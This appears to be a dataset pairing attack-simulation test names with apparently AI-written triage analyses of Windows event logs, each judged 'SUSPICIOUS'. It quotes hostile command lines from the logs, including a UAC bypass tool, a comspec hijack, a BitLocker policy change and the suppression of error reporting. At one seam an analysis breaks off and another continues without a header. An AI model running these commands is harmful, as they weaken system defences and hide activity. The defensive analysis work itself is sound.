- **SUSPICIOUS**: The actions documented require further investigation to verify the intent behind the registry modification executed via `cmd.exe`. It’s crucial to validate that the network configuration change aligns with sanctioned organizational changes, review any associated change requests, and ensure no other unauthorized modifications followed this activity."
Registry-free process scope COR_PROFILER,"Upon careful analysis of the provided Windows event logs, several observations can be made regarding potential indicators of suspicious or malicious activity:

1. **PowerShell Activity**: 
   - Multiple PowerShell executions are observed with an unusual usage of environment variables `COR_ENABLE_PROFILING`, `COR_PROFILER`, and `COR_PROFILER_PATH`. These variables are often associated with .NET profiling, potentially indicative of an attempt to inject or manipulate managed code execution. The presence of a suspicious DLL path (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.012\bin\data.012x64.dll`) suggests possible malicious intent.
   - The command line used for PowerShell includes `POWERSHELL -c 'Start-Sleep 1'`, which is often used in attempts to obfuscate malicious scripts.

2. **.NET Runtime Error**: 
   - The error in the .NET Runtime log entry about a failure to load a profiler with a specific CLSID corroborates the suspicious PowerShell commands trying to set .NET profiling environment variables.

3. **Edge Update Executions**: 
   - Several Microsoft Edge Update processes executed with various command-line arguments. While EdgeUpdate processes are generally legitimate, the frequency and manner of their execution might raise concerns about potential misuse in combination with other suspicious activities.

4. **Sysmon Logs**: 
   - Several Sysmon process creation events show legitimate system utilities such as `whoami.exe`, `hostname.exe`, and Microsoft Edge Update executables. However, the combination of frequent process executions and the usage of PowerShell with profiler environment variables strengthens the suspicion of potentially unwanted behavior.

Invoke CHM with Script Engine and Help Topic,"### Detailed Analysis of the Logs

#### Suspicious Activities and Anomalies:

1. **PowerShell Execution with Suspicious Arguments**:
   - In the Sysmon log, we see a process creation event (Event ID 1) with the command line: 
     ```
     ""powershell.exe"" & {Invoke-ATHCompiledHelp -ScriptEngine JScript -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\hh.exe -CHMFilePath Test.chm}
     ```
   - This command does not depict a typical PowerShell usage and the use of scripting engines with PowerShell, especially when trying to invoke help files (`Invoke-ATHCompiledHelp`), could indicate an attempt to run scripts or commands covertly.

2. **Frequent Execution of System Utilities**:
   - There are multiple instances of `wevtutil.exe`, `conhost.exe`, and other Windows utilities like `whoami.exe` and `hostname.exe`. Frequent execution of such commands in quick succession, especially under the same user account (`SERVER002\admin_test`), can sometimes indicate steps in a sophisticated attack, such as reconnaissance or privilege escalation.

3. **Installation/Update Processes**:
   - Several entries related to `setup.exe` for Microsoft Edge installations indicate that there could be updates occurring. Given that these are executed by `NT AUTHORITY\SYSTEM`, they could be legitimate. However, without proper correlation, these activities might mask malicious installations.

#### Indicators of Malicious Activity:
- **PowerShell Commands**: The PowerShell command is potentially suspicious as it uses unconventional methods that may bypass traditional security monitoring.
- **Process Execution Patterns**: The rapid and repeated execution of system utilities and the observed method of using PowerShell suggest potential activity aimed at maintaining persistence or collecting information on the system.

UACME Bypass Method 31,"Upon analyzing the logs provided, here are the findings and assessment:

- **Suspicious Process Execution:**
  - The execution of the file `Akagi64.exe` from a temporary folder, as seen in several Sysmon event logs, is suspicious. This process was executed by the cmd.exe with the command line `""C:\\Windows\\system32\\cmd.exe"" /c echo C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script\\31 Akagi64.exe`. The name Akagi64.exe is associated with the UACMe tool by hfiref0x, which exploits User Account Control (UAC) bypass vulnerabilities.
  - The process hierarchy indicates that the powershell.exe was used as a parent process, which is often observed in malicious use cases.

- **Legitimate Software in Use:**
  - The rest of the Sysmon logs show a large number of instances of Microsoft Edge Update components being executed, which, based on their file locations and names, appear to be consistent with legitimate software updates for Microsoft Edge.

- **Windows Defender State:**
  - As seen in the Application log, the Windows Defender is switched on, which is a good sign of a security posture, but it does not negate the suspicious execution mentioned earlier.

**Assessment of Situation:**

- Most events appear to involve activities typical of a Windows system, such as process creation and termination.
- The logs cover events from Sysmon, Application, Security, System, and Windows PowerShell channels. 
- The user ""SERVER002\\admin_test"" appears frequently with various activities under the ""High"" integrity level.

#### Suspicious Activities:
1. **Unusual Use of System Utilities:**
   - The repeated invocation of `wevtutil.exe`, `conhost.exe`, and other utilities under the user ""SERVER002\\admin_test"" without an apparent need or clear context can be indicative of malicious use, potentially for tampering with event logs or evading detection.
   - Subsequent entries show the execution of utilities like `hostname.exe` and `whoami.exe`. While these can be benign, their rapid sequential execution might suggest enumeration activity often seen in a reconnaissance phase.

2. **Unexpected Registry Modification:**
   - The logs indicate the use of `cmd.exe` to modify the registry key for BitLocker with the command `""cmd.exe"" /c reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE"" /v UseTPMKey /t REG_DWORD /d 2 /f`.
   - This can be seen as an attempt to weaken the security posture or disable encryption policies, which is a common tactic for post-exploitation in malware or attacker frameworks.

3. **Potential Time Manipulation:**
   - Security logs show a slight adjustment of system time, which can sometimes be used to manipulate file or log timestamps maliciously. However, this itself is not necessarily malicious without further context.

4. **Edge Update Logs:**
   - Frequent updates and operations from Microsoft Edge Update processes are seen in both Sysmon and Application logs. While these processes themselves are not inherently suspicious, their presence should be evaluated in the context of typical system behavior to exclude any abuse, masquerading, or misuse scenarios.

5. **High-Integrity Level Processes:**
   - Processes are running at a high integrity level, which might not be directly suspicious but suggests powerful access is being consistently employed. This is typical in administrative tasks, but frequent use without a clear administrative need can suggest spearhead activity from a higher privileged account.

#### Assessment:

- **SUSPICIOUS:** The activity noted above contains actions that appear suspicious and potentially indicative of malicious behavior. While not conclusively malicious on their own, they warrant further investigation to rule out misuse or an active threat.
  
#### Recommendations:

2. **Monitor Registry and System Utilities:**
   - Set up alerts for registry modifications, especially concerning BitLocker and encryption policies, and for process executions involving utilities with potential for abuse.
   
3. **Evaluate Edge Update Activity:**
   - Correlate the timestamps of Edge Updates with user activity to assess if these were selectively timed to overlap with potentially suspicious user-initiated actions.
   
4. **Time Settings and Integrity:**
   - Monitor system time manipulation and assess if it aligns with administrative maintenance or correlates with potentially obfuscative intents.
   
By following these steps, you can better determine if there is a threat inside the network, potentially mitigate any ongoing attack, and prevent future incidents. Further investigation should clarify the necessity and legitimacy of the logged actions."
Masquerading - wscript.exe running as svchost.exe,"Based on the analysis of the provided event logs from a Windows host, several indicators suggest suspicious activity. Here is a detailed breakdown of the analysis:

1. **Security Log Events**:
   - Events with ID 5379 show repeated attempts with the return code `3221226021`, which typically indicates some failure in logon or credential-related events. The log mentions access attempts with `MicrosoftAccount` credentials that failed. While failed logon attempts are not unusual, the repeated attempts may suggest a brute-force or credential-stuffing attack.

2. **Sysmon Log Events**:
   - There's an execution of `C:\\Windows\\System32\\cmd.exe` with a command line that copies `wscript.exe` to a location within the APPDATA directory and executes a script named `data.003_masquerading.vbs`. This kind of activity can be a sign of masquerading attacks or unauthorized code execution using legitimate binaries, commonly seen in living off the land (LOL) techniques used by attackers.
   - The subsequent execution of `svchost.exe` from `C:\\Users\\admin_test\\AppData\\Roaming\\`, which is unusual. Normally, `svchost.exe` should run from within the `C:\\Windows\\System32\\` directory, making this highly suspicious and likely indicative of a malicious payload or process masquerading.

3. **Windows Update and Edge Installer Logs**:
   - Windows Update and Microsoft Edge Installer logs appear to be normal activities related to updates of the system and browsers, typically seen in regular system maintenance activities.

Given the combination of unusual command executions, the use of system directories to run scripts from unusual paths, and the repeated credential failures, the activity in this session shows characteristics of potential illegitimate behavior and requires further scrutiny.

### Assessment:
The evidence suggests potential compromise due to:
- Use of legitimate executables (`wscript.exe`, `cmd.exe`) to execute potentially malicious scripts (`data.003_masquerading.vbs`).
- Masquerading behavior in running `svchost.exe` from an atypical directory.

### Resolution:
**SUSPICIOUS** - This activity needs further investigation to confirm whether it is malicious, particularly focusing on the intent of the script `data.003_masquerading.vbs`, and validating the source and authenticity of the `svchost.exe` being executed from an abnormal directory.

### Guidance:
- Conduct a deeper forensic investigation on the execution details of `data.003_masquerading.vbs`.
- Verify the integrity and origin of `svchost.exe` running from the user directory.
- Review user account activity for `admin_test` for unauthorized access or permissions elevation.
- Conduct an antivirus scan emphasizing the APPDATA and TEMP directories.
- Consider isolating the host if evidence pointing to compromise becomes stronger to prevent further spread or damage."
manage-bde.wsf Signed Script Command Execution,"After analyzing the provided logs, here are my observations across different types of events:

### System Log Analysis:
1. **Time Change Events**: There are several events regarding time changes from the Microsoft-Windows-Kernel-General provider, reflecting updates in the system time. These events can be part of normal operations due to time synchronization protocols such as NTP.
2. **Service Host Process**: A svchost.exe process is associated with the time change. Svchost.exe is a legitimate system process but can potentially be abused if manipulated.

### Sysmon Log Analysis:
1. **Frequent Use of wevtutil.exe**: There are numerous events indicating the usage of `wevtutil.exe`. This utility is typically used for managing Windows event logs. Frequent, recurring invocation of this tool could indicate an attempt to clear event logs or export them for review, which may be associated with malicious activity.
2. **Use of cmd.exe and cscript.exe**: The command-line `""cmd.exe"" /c set comspec=%%windir%%\\System32\\calc.exe & cscript %%windir%%\\System32\\manage-bde.wsf` stands out. It includes setting an environment variable and executing a script. The use of a seemingly benign application like calc.exe in combination with scripts can indicate a form of masquerading or malicious scripting.
3. **Processes Running under High Integrity Level**: Several processes, including cmd.exe and cscript.exe, are running under high integrity, indicating they might be executed with elevated privileges.
4. **Execution of whoami.exe and hostname.exe**: These utilities are used to gather basic system information. Their use is common for recon activity by attackers trying to understand system context.

### Security Log Analysis:
1. **Time Change Events**: Similar to the system log, changes in system time are recorded. This might correlate with system-level changes and not inherently suspicious on its own.

### Overall Assessment:
- **Frequent Execution of Event Log Utility (`wevtutil.exe`)**: Suspicious, potentially indicative of log tampering attempts.
- **Script Execution via Command-Line**: The presence of scripted command-line instructions involving environment variable manipulation and script execution via `cscript.exe` align with possible obfuscation or malicious script execution.
- **Recon Commands (whoami, hostname)**: Normal on legitimate use but in conjunction with other suspicious activities could hint at reconnaissance efforts.

### Resolution:
Given the presence of potentially obfuscating command-line instructions and frequent, unexplained use of event log utilities, the activity recorded in the logs can be classified as **SUSPICIOUS**. This warrants further investigation to confirm whether these activities are benign or part of a broader malicious attempt.

### Recommendations:
1. **Conduct a Deeper Review**: Focus on identifying any evasion techniques, such as changes in user accounts or unexpected system behavior around the event timings.

- **EventID 4624** further confirms `admin_test` session logons with `LogonType 3`, suggesting network logon, common for remote user or service activity. The account was authenticated via NTLM, particularly interesting to note for environments expecting modern authentication methods.

#### **3. Process Activities (Sysmon Logs)**
- Multiple instances of `wevtutil.exe` and `conhost.exe` launching, tied to the `admin_test` user, without explicit commands being listed could be routine, however, if abused they can read/alter the event logs or facilitate command prompt operations invisibly.
- **Critical Finding:** Execution of `cmd.exe` with a suspicious command-line creating directories and symbolic links (`mklink`). Specifically, it's attempting to recreate/redirect legitimate system tools like `cmd.exe` under different names (`mmc.exe` and `testbypass.exe`), signaling potential privilege escalation or lateral movement techniques. The sophistication of such scripting is often red flag for targeted attacks or advanced threats.

#### **4. Svchost and Other Service Executions**
- Presence of common service executables like `svchost.exe`, `TiWorker.exe`, `TrustedInstaller.exe`, `WmiPrvSE.exe`, and `sppsvc.exe`, appear expected for typical Windows service operations.

#### **5. Logon Events and Account Usage**
- **EventID: 4634** indicates an account logoff verifying the session ending for `admin_test` after the aforementioned privileged operations.
 
#### **6. Absence of Key Indicators from Application and System Context**
- A brief look into application and system contextual events in provided logs doesn't immediately reveal further malicious explainable activity beyond typical service/startup tasks.

### Summary and Threat Assessment
**Indicators of Malicious Activity:**
- High number of privilege assignments and logons (`EventID: 4672, 4624`) suggest potential misuse.
- Execution of management/utilities with non-standard commands via `cmd.exe` (`mklink`, directory creation) under sid `admin_test`.

The combination of privilege escalation, network logons from potentially unexpected workstations, and suspicious command activities point to potentially illicit or misuse behavior aligned with either an insider threat or a compromised admin account trying to escalate privileges or obfuscate actions.

### Resolution: **SUSPICIOUS**
Given the activities (particularly those related to `cmd.exe` and privilege-intensive processes), it is categorically suspicious and warrants further investigation to determine if actions were legitimate or part of a malicious series of events. Immediate steps include verifying credibility of `admin_test` activities, monitoring further anomalies, and auditing system changes and NTLM authentication instances.

Disabling ShowUI Settings of Windows Error Reporting (WER),"Upon reviewing the provided Windows event logs, we can analyze some key aspects of the events to determine any suspicious activity:

### Application Log
- Several events indicate the ""edgeupdate"" service was stopped. This by itself isn't inherently suspicious as updates to applications like Microsoft Edge can result in service restarts.

### Sysmon Log Analysis
- **Procmon Event Patterns**: We see a series of legitimate Windows processes (e.g., `whoami.exe`, `conhost.exe`, `wevtutil.exe`). These seem to be queried or utilized by a user `admin_test`, which generally indicates command-line activity. On a secure system, this could be a means of checking user information or event logs. However, it is not inherently suspicious.
  
- **Process Execution**: Several events confirm that a variety of processes tied to `MicrosoftEdgeUpdate.exe` were executed. This is expected behavior for systems updating software components like Microsoft Edge. Processes like `MicrosoftEdgeUpdateComRegisterShell64.exe` also show repeated executions; this pattern is typical during application updates and is signed by Microsoft.

- **Command-Line Execution**: One concerning entry involves `cmd.exe` executing with a command to modify the registry (`reg add ""HKCU\Software\Microsoft\Windows\Windows Error Reporting"" /v DontShowUI /t REG_DWORD /d 1 /f`). This command suppresses Windows Error Reporting UI, which could be legitimate or part of a method to conceal error messages from a user. This warrants further investigation, as it could potentially be used by malware to silence error notifications.

### General Observations
- The activity consistent with software updates (e.g., Microsoft Edge Update) is present, with multiple legitimate processes corresponding to update events and file versions matching Microsoft standards.

- Commands executed by user `admin_test`, while generally normal, should be validated if this user was known to perform administrative tasks.

### Assessment
Taking into account the logs provided, none of the activities explicitly indicate confirmed malicious actions. However, the modification of Windows Error Reporting settings and multiple command line interactions by `cmd.exe` could potentially be suspicious if not administratively intended.

**Resolution**: **SUSPICIOUS**

### Guidance
1. **User Verification**: Check if the user `admin_test` is authorized for such operations and if these actions align with their typical behavior.
   
2. **Registry Change Validation**: Confirm whether the registry modifications made by `cmd.exe` were intended:
   - If unauthorized, consider investigating further for any potential silent failures or concealed issues in software installations.
   
3. **Monitoring**: Continue to monitor processes associated with potentially sensitive command-line actions or registry modifications to prevent potential misuse or unauthorized behavior.
   
4. **System Usage Review**: Review the comprehensive system usage for a broader timeline to ensure no other unexpected activities occur, suggesting a coordinated attack or misuse.

These steps should proceed under structured incident response planning and could involve escalation if further malicious intent is detected."
